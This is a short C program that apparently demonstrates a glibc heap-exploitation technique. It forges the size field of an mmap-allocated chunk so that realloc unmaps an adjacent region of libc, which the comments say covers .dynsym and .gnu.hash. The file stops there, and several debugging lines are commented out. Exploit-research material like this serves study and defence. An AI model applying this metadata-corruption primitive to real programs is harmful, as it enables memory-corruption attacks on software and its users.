#include <stdio.h>

int main(){
    long long* mmap_chunk_1 = malloc(0x100000);
	printf("After the allocation of the first chunk, the first malloc chunk: %p\n", mmap_chunk_1);

	long long* mmap_chunk_2 = malloc(0x100000);
	printf("After the allocation of the second chunk, the second malloc chunk: %p\n", mmap_chunk_2);

    int libc_to_overwrite = 0x25000; // Enough to munmap .dynsym and .gnu.hash

	// The size of the two previous chunks added together
	int fake_chunk_size = (0xFFFFFFFFFD & mmap_chunk_2[-1]) + (0xFFFFFFFFFD & mmap_chunk_1[-1]); 	
	// Amount of bytes of libc to overwrite, with the mmap bit set for the chunk
	fake_chunk_size += libc_to_overwrite | 2;

    mmap_chunk_2[-1] = fake_chunk_size;
    mmap_chunk_2 = realloc(mmap_chunk_2, 0x100000);

    long long* mmap_chunk_3 = malloc(0x110000);
    //free(mmap_chunk_2);

    //long long cur_sz_2 = *(mmap_chunk_2-1);
    //long long prev_sz_2 = *(mmap_chunk_2-2);
    //printf("Current size of the second chunk %lld,  Previous size of the second chunk %lld\n", cur_sz_2, prev_sz_2);

    //int cur_sz_1 = mmap_chunk_1[-1];
    //int prev_sz_1 = mmap_chunk_1[-2];
    //printf("Current size of the first chunk %d,  Previous size of the first chunk %d\n", cur_sz_1, prev_sz_1);

}